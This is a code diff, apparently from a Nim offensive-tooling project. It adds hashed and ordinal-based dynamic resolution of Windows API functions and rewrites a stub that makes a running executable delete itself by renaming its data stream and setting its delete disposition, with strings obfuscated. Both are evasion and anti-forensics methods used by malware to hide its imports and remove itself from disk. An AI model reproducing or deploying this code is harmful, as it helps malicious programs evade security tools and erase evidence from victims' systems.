@@ -108,6 +108,47 @@ proc HowMuchTimeWouldYoulikeToSleep * (sec : int) =
   #echo delta.inSeconds()," Seconds"
 """
 
+let DInvokeSelfDeleteStubs * = """
+
+const
+  SHLWAPI_DLL* = obf("shlwapi.dll")
+
+type
+  CreateFileW_t* = proc (lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
+  SetFileInformationByHandle_t* = proc (hFile: HANDLE, FileInformationClass: FILE_INFO_BY_HANDLE_CLASS, lpFileInformation: LPVOID, dwBufferSize: DWORD): WINBOOL {.stdcall.}
+  GetModuleFileNameW_t* = proc (hModule: HMODULE, lpFilename: LPWSTR, nSize: DWORD): DWORD {.stdcall.}
+  CloseHandle_t* = proc (hObject: HANDLE): WINBOOL {.stdcall.}
+  PathFileExistsW_t* = proc (pszPath: LPCWSTR): WINBOOL {.stdcall.}
+
+const
+  CreateFileW_HASH * = 202946429
+  # This is a collision with GetFileInformationByHandle - ToDos for me.
+  SetFileInformationByHandle_HASH * = 244773879
+  GetModuleFileNameW_HASH * = 3757336305
+  CloseHandle_HASH * = 1614255471
+  #PathFileExistsW_HASH * = 520195386
+  PathFileExistsW_HASH * = 520195412
+
+var MyCreateFileW*: CreateFileW_t
+var MySetFileInformationByHandle*: SetFileInformationByHandle_t
+var MyGetModuleFileNameW*: GetModuleFileNameW_t
+var MyCloseHandle*: CloseHandle_t
+var MyPathFileExistsW*: PathFileExistsW_t
+
+MyCreateFileW = cast[CreateFileW_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileW_HASH, 0, FALSE)))
+
+MySetFileInformationByHandle = cast[SetFileInformationByHandle_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), SetFileInformationByHandle_HASH, 0, FALSE)))
+
+MyGetModuleFileNameW = cast[GetModuleFileNameW_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleFileNameW_HASH, 0, FALSE))
+
+MyCloseHandle = cast[CloseHandle_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CloseHandle_HASH, 0, FALSE))
+
+# Works but potentially the ordinal could change later on - will maybe lead to bugs later on
+MyPathFileExistsW = cast[PathFileExistsW_t](get_function_address(cast[HMODULE](get_library_address(SHLWAPI_DLL, TRUE)), 0, 669, FALSE))
+# Doesn't work, as the relative address is not correct. All those Ordinal functions are ignored maybe? Have to troubleshoot
+#MyPathFileExistsW = cast[PathFileExistsW_t](get_function_address(cast[HMODULE](get_library_address(SHLWAPI_DLL, TRUE)), PathFileExistsW_HASH, 0, FALSE))
+
+"""
 
 let FileDeleteStub * = """
 
@@ -121,13 +162,16 @@ let FileDeleteStub * = """
 ]# 
 
 # Don't want to import the everything from winim, only what's really needed
-from winim import CreateFileW,RtlSecureZeroMemory,RtlCopyMemory,SetFileInformationByHandle,GetModuleFileNameW,CloseHandle,PathFileExistsW,PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
+from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
 from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE
+
+template RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)
+template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = copyMem(Destination, Source, Length)
 
 var DS_STREAM_RENAME = newWideCString(obf(":thiswontexist"))
 
 proc ds_open_handle(pwPath: PWCHAR): HANDLE =
-    return CreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
+    return MyCreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)
 
 proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
     var fRename: FILE_RENAME_INFO
@@ -137,7 +181,7 @@ proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
     fRename.FileNameLength = sizeof(lpwStream).DWORD
     RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))
 
-    return SetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))
+    return MySetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))
 
 proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
     var fDelete: FILE_DISPOSITION_INFO
@@ -145,7 +189,7 @@ proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
 
     fDelete.DeleteFile = TRUE
 
-    return SetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)
+    return MySetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)
 
 when isMainModule:
     var
@@ -154,7 +198,7 @@ when isMainModule:
 
     RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath))
 
-    if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
+    if MyGetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
         echo obf("[-] Failed to get the current module handle")
         quit(QuitFailure)
 
@@ -169,7 +213,7 @@ when isMainModule:
         quit(QuitFailure)
 
     echo obf("[*] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle")
-    CloseHandle(hCurrent)
+    discard MyCloseHandle(hCurrent)
 
     hCurrent = ds_open_handle(addr wcPath[0])
     if hCurrent == INVALID_HANDLE_VALUE:
@@ -181,9 +225,9 @@ when isMainModule:
         quit(QuitFailure)
 
     echo obf("[*] Closing handle to trigger deletion deposition")
-    CloseHandle(hCurrent)
+    discard MyCloseHandle(hCurrent)
 
-    if not PathFileExistsW(addr wcPath[0]).bool:
+    if not MyPathFileExistsW(addr wcPath[0]).bool:
         echo obf("[*] File deleted successfully")
 
 """
